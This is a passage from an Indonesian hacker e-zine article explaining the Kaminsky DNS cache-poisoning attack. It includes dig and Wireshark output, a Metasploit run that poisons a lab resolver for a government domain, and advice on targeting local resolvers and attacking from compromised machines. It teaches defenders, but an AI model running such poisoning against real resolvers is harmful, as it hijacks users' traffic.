@@ -1,0 +1,1112 @@
+
+                                                  ______          _     _____ 
+                                       ___   __ _(_)  __|___   __| |___|____ |
+                                      / _ \ / _` | |\ \ / _ \ / _` |__ \ |_  |
+                                      \__  | | | | |_\ \ (_) | | | |__) |__| |
+                                      |___/|_| |_|_|____\___/|_| |_|___/_____|
+
+                    
+                                              [ echo|zine, volume 6 issue 19 ]            
+                                 
+ 			   	      Bailiwicked DNS Attack (Cache Poisoning)
+ 					          Brought To You By : Cyberheb
+				  email: cyberheb/et/kecoak-elektronik/dot/net 
+                     	                 URL: http://kecoak-elektronik/dot/net
+
+=======	Intro ---|
+
+Bugs DNS yang ditemukan oleh Dan Kaminsky merupakan bugs DNS paling parah
+sepanjang sejarah internet, beberapa pihak bahkan menyebutkan bugs DNS ini
+merupakan bugs paling parah diantara seluruh jenis bugs yang pernah ditemukan.
+Rasanya memang tidak salah jika Dan merencanakan metode patch yang baru pertama
+kali dilakukan oleh dunia sejak internet ditemukan dimana rilis patch dilakukan
+secara bersamaan dengan dukungan lebih dari 80 vendor DNS. 
+
+DNS merupakan salah satu pilar pembentuk infrastruktur internet di dunia. Jika
+terdapat hole pada DNS, maka efeknya akan dirasakan oleh seluruh masyarakat
+pengguna internet. Sebagai tambahan informasi, bugs DNS ini tidak spesifik pada
+produk dari vendor tertentu namun lebih kepada bugs pada protokol.
+Vendor/Developer akan mengembangkan produk DNS berdasarkan spesifikasi
+protokol, maka jika protokol tersebut bermasalah dapat dengan mudah diambil
+kesimpulan bahwa implementasi produk-produk DNS akan ikut terkena masalah. 
+
+Informasi lengkap mengenai bugs ini sudah bertebaran di internet, termasuk
+exploitnya. Awalnya penulis cukup terkejut karena banyak yang tidak memahami
+prinsip dasar bugs DNS ini, dan juga cukup terkejut saat mengetahui beberapa
+administrator belum melakukan patch pada sistem mereka. Namun pada akhirnya
+bisa dipahami dengan membaca pernyataan Cricket Liu (expert DNS):
+
+"From our surveys with The Measurement Factory, there are about 11 million name
+servers on the Internet".
+
+Ada 11 juta name server pada internet per tahun 2008. Sekolah memiliki
+nameserver, perusahaan memiliki nameserver, dan bahkan warnet juga memiliki
+nameserver. Maka tidak mengherankan betapa mudahnya mendapatkan nameserver yang
+belum diupdate dan tidak semua system administrator memahami pentingnya update
+nameserver untuk menghindari bugs ini.
+
+Pada artikel ini penulis coba rangkum informasi dari berbagai sumber untuk
+dituangkan dalam bentuk artikel berbahasa Indonesia berikut implementasi
+serangan agar lebih mudah dipahami oleh masyarakat internet indonesia,
+khususnya system administrator untuk melindungi para pengguna internet.
+
+
+=======	Domain Name System ---|
+
+DNS merupakan metode yang digunakan oleh internet untuk mendapatkan data alamat
+ip dari suatu sistem berdasarkan data nama yang mudah diingat oleh manusia.
+Jadi jika kita menuliskan pada url suatu browser: http://www.depkominfo.go.id,
+maka oleh komputer yang kita gunakan nama tersebut akan di translasi terlebih
+dahulu ke dalam bentuk alamat IP yang bisa dihubungi. Misalnya untuk
+www.depkominfo.go.id menggunakan ip 222.124.199.87. 
+
+Bentuk format alamat IP inilah yang kemudian dapat dihubungi melalui internet
+untuk mendapatkan servis tertentu. Pada contoh, kita menghubungi server
+www.depkominfo.go.id pada alamat 222.124.199.87 melalui protokol http (web).
+Sistem internet tidak akan memahami bagaimana caranya menghubungi server
+www.depkominfo.go.id secara langsung,untuk itulah diperlukan translasi dari
+kata-kata yang mudah diingat oleh manusia kedalam bentuk alamat ip yang
+dipahami oleh internet.
+
+Jumlah sistem di internet sangat banyak, dan tidak mungkin mengingat semua data
+tersebut. Untuk itulah dibutuhkan suatu mekanisme translasi otomatis dan
+efisien dimana pengguna internet tidak perlu mengetahui seluruh alamat IP dari
+sistem-sistem internet, semuanya akan dihandle oleh sistem dan kita cukup
+mengingat nama server tersebut.
+
+Pada skenario DNS yang umum digunakan, ada 3 macam pemain:
+
+1. Komputer yang kita gunakan
+2. Recursive DNS server (resolver)
+3. Authoritative DNS server
+
+Recursive DNS server merupakan DNS server ISP yang kita gunakan, atau DNS
+server sekolah, atau DNS server warnet, dsb. Recursive DNS server merupakan
+nameserver yang kita set pada konfigurasi network untuk translate nama server
+kedalam bentuk IP Address. Authoritative DNS server merupakan nameserver yang
+menyimpan IP public suatu server agar dapat diakses melalui internet. Sebagai
+informasi tambahan, komputer yang kita gunakan dan recursive dns server biasa
+disebut sebagai resolver (tolong diingat istilah ini karena akan kita gunakan
+hingga akhir artikel), yang berarti akan meneruskan request tersebut kepada
+server yang bertanggung jawab atas domain tertentu secara recursive.
+
+Kita akan melihat bagaimana proses translasi komputer pribadi untuk suatu
+alamat domain secara sistematis (hasil output difilter untuk menampilkan
+poin-poin penting).
+
+Jasmine:~ Cyberheb$ dig www.depkominfo.go.id
+
+;; QUESTION SECTION:
+;www.depkominfo.go.id.		IN	A
+
+;; ANSWER SECTION:
+www.depkominfo.go.id.	3600	IN	A	222.124.199.87
+
+;; AUTHORITY SECTION:
+depkominfo.go.id.	3600	IN	NS	ns.depkominfo.go.id.
+depkominfo.go.id.	3600	IN	NS	ns1.depkominfo.go.id.
+
+
+
+Hasil diatas menunjukan query suatu domain beserta hasilnya. Berikut ini
+penjelasan singkatnya (dari sudut pandang komputer pribadi):
+
+Komputer pribadi akan meminta data alamat IP dari server www.depkominfo.go.id
+yang kemudian akan disampaikan kepada resolver, resolver akan melihat informasi
+tersebut pada cache dan jika tidak ditemukan maka resolver (misal: nameserver
+ISP) akan meneruskan request ke root nameserver (saat ini ada 13 root
+nameserver didunia) untuk mendapatkan list nameserver yang bertanggung jawab
+terhadap domain .id, resolver kemudian akan menghubungi nameserver .id untuk
+menanyakan informasi nameserver yang bertangungjawab terhadap domain .go.id,
+.go.id akan memberikan respon bahwa ns.depkominfo.go.id dan
+ns1.depkominfo.go.id adalah nameserver yang bertanggung jawab terhadap domain
+tersebut.
+
+Hasil output diatas merupakan respon jika dilihat dari sudut pandang komputer
+yang kita gunakan, perjalanan hasil query antar resolver lengkap yang
+sebenarnya dapat dilihat pada output dibawah ini:
+
+
+Jasmine:~ Cyberheb$ dig @ns.depkominfo.go.id
+;; QUESTION SECTION:
+;.				IN	NS
+
+;; ANSWER SECTION:
+.			95418	IN	NS	G.ROOT-SERVERS.NET.
+.			95418	IN	NS	H.ROOT-SERVERS.NET.
+.			95418	IN	NS	I.ROOT-SERVERS.NET.
+.			95418	IN	NS	J.ROOT-SERVERS.NET.
+.			95418	IN	NS	K.ROOT-SERVERS.NET.
+.			95418	IN	NS	L.ROOT-SERVERS.NET.
+.			95418	IN	NS	M.ROOT-SERVERS.NET.
+.			95418	IN	NS	A.ROOT-SERVERS.NET.
+.			95418	IN	NS	B.ROOT-SERVERS.NET.
+.			95418	IN	NS	C.ROOT-SERVERS.NET.
+.			95418	IN	NS	D.ROOT-SERVERS.NET.
+.			95418	IN	NS	E.ROOT-SERVERS.NET.
+.			95418	IN	NS	F.ROOT-SERVERS.NET.
+
+;; ADDITIONAL SECTION:
+J.ROOT-SERVERS.NET.	181818	IN	A	192.58.128.30
+J.ROOT-SERVERS.NET.	181818	IN	AAAA	2001:503:c27::2:30
+
+----------------------------- END ---------------------------------
+
+Jasmine:~ Cyberheb$ dig @J.ROOT-SERVERS.NET id
+;; QUESTION SECTION:
+;id.				IN	A
+
+;; AUTHORITY SECTION:
+id.			172800	IN	NS	SEC3.APNIC.NET.
+id.			172800	IN	NS	NS1.id.
+id.			172800	IN	NS	NS1.RAD.NET.id.
+id.			172800	IN	NS	NS1.INDO.NET.id.
+
+;; ADDITIONAL SECTION:
+NS1.id.			172800	IN	A	202.155.30.227
+NS1.RAD.NET.id.		172800	IN	A	202.154.1.2
+NS1.INDO.NET.id.	172800	IN	A	202.159.32.2
+SEC3.APNIC.NET.		172800	IN	A	202.12.28.140
+SEC3.APNIC.NET.		172800	IN	AAAA	2001:dc0:1:0:4777::140
+
+----------------------------- END ---------------------------------
+
+Jasmine:~ Cyberheb$ dig @NS1.id go.id
+;; QUESTION SECTION:
+;go.id.				IN	A
+
+;; AUTHORITY SECTION:
+go.id.			600	IN	SOA	ns.net.id. domain.depkominfo.go.id. 2008080159 21600 3600 691200 86400
+
+----------------------------- END ---------------------------------
+
+Jasmine:~ Cyberheb$ dig @ns.net.id www.depkominfo.go.id
+;; QUESTION SECTION:
+;www.depkominfo.go.id.		IN	A
+
+;; ANSWER SECTION:
+www.depkominfo.go.id.	1771	IN	A	222.124.199.87
+
+;; AUTHORITY SECTION:
+depkominfo.go.id.	1022	IN	NS	ns1.depkominfo.go.id.
+depkominfo.go.id.	1022	IN	NS	ns.depkominfo.go.id.
+
+;; ADDITIONAL SECTION:
+ns.depkominfo.go.id.	1022	IN	A	222.124.199.71
+ns1.depkominfo.go.id.	1022	IN	A	222.124.169.162
+
+----------------------------- END ---------------------------------
+
+
+Dari struktur respon diatas, kita dapat membagi struktur dns response menjadi 3
+bagian penting.  
+1. Answer Section 
+2. Authority Section 
+3. Additional Section
+
+Answer section merupakan jawaban atas pertanyaan (Query) yang kita sampaikan
+kepada resolver, yaitu alamat IP publik dari server. Query terhadap suatu
+resolver juga ada beberapa tipe, diantaranya A (ip address) dan NS (name
+server). Authority section merupakan list authoritative dns server yang
+bertanggung jawab atas domain tersebut, dalam hal ini 2 buah nameserver,
+ns.depkominfo.go.id dan ns1.depkominfo.go.id. Dan additional section merupakan
+salah satu bagian terpenting pada pembahasan bugs dns ini yang bisa disebut
+masalah "egg and chicken", additional section akan memberikan alamat IP dari
+authoritative dns server untuk suatu domain.
+
+Pada bagian awal telah dibicarakan bahwa segala sistem di internet hanya dapat
+berkomunikasi melalui alamat IP, oleh karena itu untuk mengetahui dimana letak
+authoritative dns server suatu domain harus diketahui juga alamat IP nya, dan
+informasi inilah yang dikirimkan pada response dns query. Bagian ini sering
+juga disebut sebagai glue records.
+
+Pada akhir proses translasi, resolver akan mendapatkan informasi alamat ip
+www.depkominfo.go.id dari ns.depkominfo.go.id, dan menggunakan alamat ip itu
+untuk proses routing menuju server tersebut.
+
+Berikut hasil dump menggunakan wireshark terhadap 2 paket dari skenario diatas
+(Query dan Response DNS), harap diperhatikan baik-baik karena hasil dump ini
+akan kita jadikan sebagai referensi format paket data DNS hingga akhir artikel:
+
+
+--------- Query -------------
+
+Domain Name System (query)
+    [Response In: 46]
+    Transaction ID: 0x56dd
+    Flags: 0x0100 (Standard query)
+        0... .... .... .... = Response: Message is a query
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ...0 .... = Non-authenticated data OK: Non-authenticated data is unacceptable
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 0
+    Additional RRs: 0
+    Queries
+        www.depkominfo.go.id: type A, class IN
+            Name: www.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+
+--------- END Query -------------
+
+----------- Response ------------
+
+Domain Name System (response)
+    [Request In: 39]
+    [Time: 0.924113000 seconds]
+    Transaction ID: 0x56dd
+    Flags: 0x8580 (Standard query response, No error)
+        1... .... .... .... = Response: Message is a response
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... .1.. .... .... = Authoritative: Server is an authority for domain
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... 1... .... = Recursion available: Server can do recursive queries
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server
+        .... .... .... 0000 = Reply code: No error (0)
+    Questions: 1
+    Answer RRs: 1
+    Authority RRs: 2
+    Additional RRs: 2
+    Queries
+        www.depkominfo.go.id: type A, class IN
+            Name: www.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+    Answers
+        www.depkominfo.go.id: type A, class IN, addr 222.124.199.87
+            Name: www.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 4
+            Addr: 222.124.199.87
+    Authoritative nameservers
+        depkominfo.go.id: type NS, class IN, ns ns.depkominfo.go.id
+            Name: depkominfo.go.id
+            Type: NS (Authoritative name server)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 5
+            Name server: ns.depkominfo.go.id
+        depkominfo.go.id: type NS, class IN, ns ns1.depkominfo.go.id
+            Name: depkominfo.go.id
+            Type: NS (Authoritative name server)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 6
+            Name server: ns1.depkominfo.go.id
+    Additional records
+        ns.depkominfo.go.id: type A, class IN, addr 222.124.199.71
+            Name: ns.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 4
+            Addr: 222.124.199.71
+        ns1.depkominfo.go.id: type A, class IN, addr 222.124.169.162
+            Name: ns1.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+            Time to live: 1 hour
+            Data length: 4
+            Addr: 222.124.169.162
+
+----------- END Response ---------
+
+Untuk memahami konsep bugs bailiwick dibutuhkan pemahaman konsep cara kerja
+DNS. Sebelumnya tolong tanamkan pada pikiran kita bahwa jenis serangan yang
+akan dilakukan bukan berjenis eksploitasi server. Eksploitasi dengan
+memanfaatkan kelemahan pada suatu implementasi DNS (misal: BIND) untuk
+mendapatkan rootshell-nya bukanlah hal yang akan dibahas sekarang ini. Serangan
+yang dimaksud adalah eksploitasi pada mekanisme dns, dimana kita dapat
+mengalihkan request yang dilakukan oleh user terhadap suatu resolver ke server
+yang dapat kita kontrol. Bahasa kerennya, DNS Cache poisoning.
+
+Bagian berikutnya kita akan membahas feature penting dari DNS yang akan
+dijadikan target serangan DNS poisoning secara berurutan, dilanjutkan juga
+dengan mekanisme patch DNS terhadap masing-masing serangan tersebut.
+
+=======	QID/TXID dan UDP ---|
+
+DNS menggunakan protokol UDP pada transport layer. Seperti yang telah kita
+ketahui bersama bahwa UDP merupakan protocol transport (silahkan baca teori
+basic tentang TCP/IP) yang digunakan untuk tipe aplikasi connectionless,
+sehingga protokol tersebut tidak memberikan jaminan apakah paket query yang
+dikirim telah diterima oleh nameserver, dan apakah paket response dari
+nameserver merupakan jawaban atas pertanyaan yang kita berikan.  Untuk
+mengatasi masalah pada transport layer inilah maka aplikasi DNS membutuhkan
+suatu mekanisme sendiri yang dapat digunakan untuk memberikan jaminan atas
+permasalahan diatas, disinilah peran QID dibutuhkan.
+
+Pada paket data DNS (query maupun response), setiap paket dilengkapi dengan
+informasi QID. QID terdiri dari 16 bit, sehingga bisa kita ambil kesimpulan QID
+(Query ID) untuk paket-paket data DNS memiliki range 1-65536. QID inilah yang
+akan digunakan untuk mencocokan response yang diterima oleh suatu resolver
+terhadap query yang dilakukan oleh resolver tersebut.
+
+Kita dapat melihat QID (atau disebut juga Transaction ID) pada raw format hasil
+capture wireshark diatas bagian awal paket DNS. Transaction ID/QID tersebut
+adalah "0x56dd".
+
+
+| -- Old Attack #1
+
+Sepanjang sejarah DNS, ada 2 metode serangan yang dapat dilakukan untuk
+meracuni cache suatu nameserver. Yang pertama serangan dilakukan terhadap
+kelemahan implementasi QID pada protokol DNS. Pada  tahun 1997 BIND (DNS
+server/resolver) saat itu melakukan implementasi QID secara sequential, dalam
+arti untuk setiap query yang dilakukan oleh resolver nilai QID merupakan "nilai
+QID sebelumnya plus 1". Dengan mengetahui fakta ini, maka kita dapat meracuni
+cache suatu resolver dengan memberikan response palsu sebelum response aslinya
+datang menggunakan QID yang mudah diprediksi.
+
+Attacker dapat melakukan hal ini dengan mudah melalui spoofing packet.
+Misalnya: berpura-pura menanyakan alamat ip suatu server kepada resolver namun
+sekaligus mengirimkan jawabannya. Attacker dapat mengirimkan beberapa paket
+spoofing untuk menyesuaikan QID sebenarnya yang dikirimkan oleh resolver. Jadi
+seandainya diketahui resolver pada saat (t) menggunakan QID 100, maka kita
+dapat berpura-pura mengirimkan paket dns query pada (t+1) dengan sekaligus
+menyediakan paket responsenya menggunakan QID 101 - 150. Harap diingat bahwa
+DNS berkomunikasi menggunakan connectionless protokol (UDP), sehingga jika
+paket response kita sampai lebih dulu pada resolver dan di cek QID nya sama
+maka resolver akan memasukan informasi yang kita kirimkan tersebut pada
+cachenya. Trik ini dapat digunakan untuk meracuni cache DNS server, selanjutnya
+jika ada pengguna lain nameserver tersebut hendak membuka website domain yang
+telah di racuni, maka requestnya akan diarahkan pada server pribadi milik kita
+sesuai data pada paket response.
+
+Metode serangan seperti ini telah dibahas sejak tahun 1989. Berbagai cara
+dilakukan untuk mencari tau QID dari suatu nameserver. Setelah tahun 1997 BIND
+memutuskan untuk menggunakan random QID pada setiap query, sehingga penyerang
+akan lebih sulit menebak data QID tersebut.
+
+Serangan terhadap implementasi QID semakin berkembang. Tahun 2007, Amit Klein
+memberikan Proof of Concept bahwa implementasi PRNG (Pseudo Random Number
+Generator) pada BIND dapat di patahkan secara efisien. Hal ini membuat random
+Source port UDP dan random QID dari suatu nameserver dapat ditebak dengan lebih
+efisien. Pembahasan mengenai ini diluar artikel. Untuk saat ini cukup dipahami
+bahwa serangan dns cache poisoning membutuhkan informasi QID untuk di spoofing.
+
+
+| -- Old Attack #2
+
+Jenis serangan kedua terhadap cache suatu DNS pertama kali ditemukan sekitar
+tahun 1997. Serangan dilakukan oleh kashpureff dalam rangka aksi protes
+terhadap suatu bisnis, hingga saat ini jenis serangan tersebut disebut
+kashpureff attack. Kashpureff attack memanfaatkan kelemahan pada glue
+records/additional section. Kembali kita perhatikan response dari suatu
+nameserver:
+
+;; QUESTION SECTION:
+;www.depkominfo.go.id.		IN	A
+
+;; ANSWER SECTION:
+www.depkominfo.go.id.	3600	IN	A	222.124.199.87
+
+;; AUTHORITY SECTION:
+depkominfo.go.id.	3600	IN	NS	ns1.depkominfo.go.id.
+depkominfo.go.id.	3600	IN	NS	ns.depkominfo.go.id.
+
+;; ADDITIONAL SECTION:
+ns.depkominfo.go.id.	3600	IN	A	222.124.199.71
+ns1.depkominfo.go.id.	3600	IN	A	222.124.169.162
+www.google.com. 	43200  	IN  	A   	41.37.37.22
+
+Terlihat perbedaannya?! yup, kashpureff-attack sengaja men-setup suatu
+nameserver yang sudah dikutak-katik code-nya sehingga apabila ada request
+terhadap nameserver tersebut akan ditambahkan satu record pada bagian
+additional section/glue record. Nameserver yang mendapatkan response tersebut
+akan menambahkan data tambahan kedalam cache miliknya. Bagaimana cara penyerang
+membuat korban melakukan query terhadap nameserver miliknya tersebut?!Penyerang
+dapat dengan mudah menggunakan attack-vector berupa halaman website yang
+contentnya menunjuk domain nameserver tersebut, misalnya: <img
+src="http://blog.evil.com">, secara diam-diam browser pengguna akan melakukan
+query terhadap nameserver domain evil.com saat membuka page website via
+nameserver miliknya (contoh:isp), dan secara tidak langsung saat mendapatkan
+response untuk evil.com nameserver ISP juga mendapatkan response tambahan untuk
+google.com, pada saat berikutnya ketika pengguna lain nameserver ISP tersebut
+melakukan query untuk google.com alamat ip nya sudah berubah menuju alamat ip
+server penyerang (41.37.37.22).
+
+Mekanisme patch terhadap jenis serangan ini dilakukan menggunakan "bailiwick".
+Dengan bailiwick, maka informasi dalam additional section dibatasi hanya pada
+nameserver yang memiliki authority atas domain tersebut. Jika resolver meminta
+domain ftp.depkominfo.go.id, maka resolver hanya akan menerima response didalam
+domain depkominfo.go.id, response terhadap domain lain akan di-ignore.
+
+Pemahaman terhadap konsep bailiwick ini juga akan dijadikan konsep dasar hole
+Dan Kaminsky.
+
+
+| -- 2008...
+
+Jenis hole yang ditemukan oleh Dan Kaminsky merupakan perpaduan antara old
+attack #1 dan old attack #2. Hole tersebut memanfaatkan kelemahan QID yang
+hanya 16 bit disertai penggunaan protokol UDP sehingga dapat di bruteforce
+menggunakan paket flooding, dan memanfaatkan kelemahan pada "bailiwick
+checking". Bentuk response dari hole Dan kaminsky sebagai berikut:
+
+;; QUESTION SECTION:
+;notexist.depkominfo.go.id.		IN	A
+
+;; ANSWER SECTION:
+notexist.depkominfo.go.id.	120	IN	A	41.41.41.41
+
+;; AUTHORITY SECTION:
+depkominfo.go.id.		86400	IN	NS	www.depkominfo.go.id.
+
+;; ADDITIONAL SECTION:
+www.depkominfo.go.id.		604800	IN	A	41.41.41.42
+
+Penyerang berusaha untuk membuat resolver melakukan query terhadap
+notexist.depkominfo.go.id, dan kemudian juga sekaligus mengirimkan response
+untuk notexist.depkominfo.go.id pada bagian answer, menyediakan informasi
+authority nameserver domain tersebut pada bagian authority section,
+dan...memberikan alamat IP nameserver domain tersebut pada bagian additional
+section. Harap diingat bahwa penyerang juga harus menyesuaikan QID response
+yang dikirimkan agar data tipuan tersebut dimasukan pada cache dns target. Jika
+berhasil, maka cache dns server akan teracuni informasi palsu dan mengarahkan
+semua request depkominfo.go.id menuju nameserver yang telah dipersiapkan oleh
+penyerang.
+
+Hole ini berhasil mematahkan proses in-bailiwick checking resolver.
+Nameserver/resolver yang dijadikan target serangan akan percaya sepenuhnya pada
+response tersebut karena www.depkominfo.go.id memang berada didalam bailiwick
+checking (*.depkominfo.go.id). 
+
+That's it?! so simple, isn't it? :).
+
+
+=======	Teknik Eksploitasi ---|
+
+Dengan adanya public disclosure mengenai hole ini, maka exploit beserta aksi
+kejahatan lainnya merebak dalam waktu kurang dari 24 jam. Pada bagian akhir
+kita akan membahas kemungkinan jenis kejahatan yang dapat dilakukan dengan
+memanfaatkan hole ini. Teknik eksploitasi ada berbagai macam, selain logic
+serangan yang akan mempengaruhi hasilnya, bahasa pemrograman yang digunakan
+juga ikut berperan serta. Berdasarkan keterangan Dan kaminsky, awalnya
+digunakan python sebagai eksploit namun karena terlalu lamban maka diganti
+menggunakan C. C diklaim dapat melakukan dns cache poisoning suatu resolver
+dalam watu kurang dari 1 menit (kecepatan internet juga mempengaruhi). Berikut
+ini permasalahan yang dihadapi untuk membuat eksploit hole diatas:
+
+1. QID/TXID
+
+Inti dari hole Kaminsky adalah pada bailiwick checking, namun kita tetap
+berhadapan dengan masalah QID DNS. Untuk implementasi DNS server saat ini
+dimana QID merupakan data 16 bit maka dibutuhkan mekanisme agar dapat lebih
+dahulu memberikan response dengan QID yang tepat kepada resolver.  Bentuk
+eksploit saat ini menggunakan trik non-exist domain, misal: aaaa.google.com,
+aaab.google.com, dst. Sehingga apabila paket response dari nameserver asli
+datang lebih dulu maka jawabannya adalah NXDOMAIN (non-exist domain), sedangkan
+jika pake response hasil spoofing kita sampai lebih dulu maka jawabannya adalah
+alamat nameserver (A). Tehnik bruteforce QID ada berbagai macam dan dapat
+digunakan untuk meloloskan paket bruteforce response kita.
+
+2. UDP Protocol
+
+Hal ini berkaitan dengan konfigurasi dan implementasi nameserver itu sendiri.
+Beberapa nameserver menggunakan random source port saat melakukan dns query,
+sehingga jika kita ingin melakukan spoofing paket response bukan hanya harus
+menebak QID yang digunakan server tersbut saat mengirimkan query namun juga
+harus menebak source udp port yang digunakan. Hal ini menambah kompleksitas
+bruteforce menjadi 2^16 x 2^16 (16 bit QID x 16 bit source udp port).
+
+3. Speed
+
+Kecepatan koneksi juga ikut mempengaruhi proses bruteforce, hal ini adalah
+masalah klasik. Jika kita menggunakan koneksi dial-up (telkomnet????) untuk
+menyerang nameserver suatu ISP mungkin akan sia-sia, karena koneksi antara DNS
+server ISP dengan DNS server domain yang asli lebih cepat dibandingkan koneksi
+kita dengan DNS ISP maka paket response dari DNS server domain asli akan sampai
+lebih dulu. Hal ini mungkin akan berbeda jika kita bisa memiliki koneksi yang
+sangat cepat. Teknik paling mudah adalah menyerang DNS lokal (warnet, sekolah,
+kantor, dll) karena koneksi antara komputer yang kita gunakan untuk menyerang
+umumnya lebih cepat dibandingkan koneksi antara DNS server lokal tersebut
+dengan DNS server domain asli.
+
+4. Recursive
+
+Beberapa konfigurasi DNS server tidak mengijinkan dilakukan recursive query,
+atau membatasi recursive query hanya pada network tertentu sehingga akses
+melakukan eksploitasi terbatas hanya pada lokal area network tempat DNS server
+tersebut berada.
+
+
+=======	 Exploit in Action ---|
+
+Untuk contoh penggunaan eksploit dan efeknya penulis menggunakan metasploit
+framework. Dalam real attack penggunaan metasploit framework jelas kurang
+efisien karena masih terlalu lama untuk dapat sukses melakukan injeksi,
+terlebih lagi jika kita menggunakan koneksi yang lamban (somehow, masalah ini
+bisa diatasi, mis: dengan melakukan serangan via salah satu mesin korban lain
+yang telah di own dan memiliki bandwidth tinggi ;) ), namun prinsip kerja
+metasploit (terutama kalkulasi jumlah spoofing paket per query dan response)
+cukup lengkap untuk dijadikan sebagai referensi. 
+
+
+
+msf auxiliary(bailiwicked_domain) > show options
+
+Module options:
+
+   Name     Current Setting   Required  Description
+   ----     ---------------   --------  -----------
+   DOMAIN   depkominfo.go.id  yes       The domain to hijack
+   NEWDNS   192.168.2.105     yes       The hostname of the replacement DNS server
+   RECONS   208.67.222.222    yes       The nameserver used for reconnaissance
+   RHOST    192.168.2.102     yes       The target address
+   SRCADDR  Real              yes       The source address to use for sending the queries (accepted: Real, Random)
+   SRCPORT  53                yes       The target server's source query port (0 for automatic)
+   TTL      44910             yes       The TTL for the malicious host entry
+   XIDS     0                 yes       The number of XIDs to try for each query (0 for automatic)
+
+msf auxiliary(bailiwicked_domain) > exploit
+[*] Targeting nameserver 192.168.2.102 for injection of depkominfo.go.id. nameservers as 192.168.2.105
+[*] Querying recon nameserver for depkominfo.go.id.'s nameservers...
+[*]  Got an NS record: depkominfo.go.id.       3496    IN      NS      ns.depkominfo.go.id.
+[*]   Querying recon nameserver for address of ns.depkominfo.go.id....
+[*]    Got an A record: ns.depkominfo.go.id.    3496    IN      A       222.124.199.71
+[*]     Checking Authoritativeness: Querying 222.124.199.71 for depkominfo.go.id....
+[*]     ns.depkominfo.go.id. is authoritative for depkominfo.go.id., adding to list of nameservers to spoof as
+[*]  Got an NS record: depkominfo.go.id.       3496    IN      NS      ns1.depkominfo.go.id.
+[*]   Querying recon nameserver for address of ns1.depkominfo.go.id....
+[*] Calculating the number of spoofed replies to send per query...
+[*]   race calc: 100 queries | min/max/avg time: 1.11/188.08/3.72 | min/max/avg replies: 368/65438/1313
+[*] Sending 1969 spoofed replies from each nameserver (1) for each query
+[*] Attempting to inject poison records for depkominfo.go.id.'s nameservers into 192.168.2.102:53...
+[*] Poisoning successful after 250 queries and 492250 responses: depkominfo.go.id. == 192.168.2.105
+[*] Auxiliary module execution completed
+
+
+Jasmine:~ Cyberheb$ dig -t NS @192.168.2.102 depkominfo.go.id
+
+; <<>> DiG 9.4.1-P1 <<>> -t NS @192.168.2.102 depkominfo.go.id
+; (1 server found)
+;; global options:  printcmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49356
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;depkominfo.go.id.		IN	NS
+
+;; ANSWER SECTION:
+depkominfo.go.id.	41164	IN	NS	192.168.2.105.
+
+;; Query time: 37 msec
+;; SERVER: 192.168.2.102#53(192.168.2.102)
+;; WHEN: Sun Aug  3 18:49:22 2008
+;; MSG SIZE  rcvd: 61
+
+
+Pada demo diatas, kita melakukan cache poisoning terhadap DNS server
+192.168.2.102 untuk domain depkominfo.go.id, hasil akhirnya seluruh query
+domain depkominfo.go.id akan diarahkan pada DNS server 192.168.2.105. Seluruh
+client yang menunjuk 192.168.2.102 juga akan mendapatkan hasil yang sama.
+Metasploit menggunakan opendns untuk proses RECONS authoritative DNS server
+domain depkominfo.go.id, hal ini dilakukan untuk mencegah data tersebut masuk
+cache DNS server target jika dilakukan query secara langsung (asumsi kita belum
+tau nameserver untuk domain depkominfo.go.id). FYI, kita tidak hanya dapat
+menggunakan opendns, namun juga bisa menggunakan open DNS server yang lain.
+Phoenix dari k-elektronik pernah membuat tools untuk mencari open DNS server
+ini pada internet.
+
+Setelah mendapatkan informasi authoritative nameserver, metasploit akan
+menghitung berapa jumlah response terhadap setiap query yang dikirimkan, dengan
+ini diharapkan proses bruteforce QID akan lebih efisien. Berikut ini hasil
+capture paket-paket data yang sampai di DNS target, dan akan memperlihatkan
+implementasi dari 'asumsi' yang dilontarkan oleh halvar flake saat membuka rahasia hole DNS Dan Kaminsky:
+
+Internet Protocol, Src: 192.168.2.105 (192.168.2.105), Dst: 192.168.2.102 (192.168.2.102)
+User Datagram Protocol, Src Port: 47498 (47498), Dst Port: domain (53)
+Domain Name System (query)
+    [Response In: 276016]
+    Transaction ID: 0xffd4
+    Flags: 0x0100 (Standard query)
+        0... .... .... .... = Response: Message is a query
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...1 .... .... = Recursion desired: Do query recursively
+        .... .... .0.. .... = Z: reserved (0)
+        .... .... ...0 .... = Non-authenticated data OK: Non-authenticated data is unacceptable
+    Questions: 1
+    Answer RRs: 0
+    Authority RRs: 0
+    Additional RRs: 0
+    Queries
+        VmlcscEEItDB9.depkominfo.go.id: type A, class IN
+            Name: VmlcscEEItDB9.depkominfo.go.id
+            Type: A (Host address)
+            Class: IN (0x0001)
+
+Internet Protocol, Src: 192.168.2.102 (192.168.2.102), Dst: 222.124.199.71 (222.124.199.71)
+User Datagram Protocol, Src Port: domain (53), Dst Port: domain (53)
+Domain Name System (query)
+    [Response In: 276013]
+    Transaction ID: 0x2e16
+    Flags: 0x0010 (Standard query)
+        0... .... .... .... = Response: Message is a query
+        .000 0... .... .... = Opcode: Standard query (0)
+        .... ..0. .... .... = Truncated: Message is not truncated
+        .... ...0 .... .... = Recursion desired: Don't do query recursively
+        .... .... .0.. .... = Z: reserved (0)
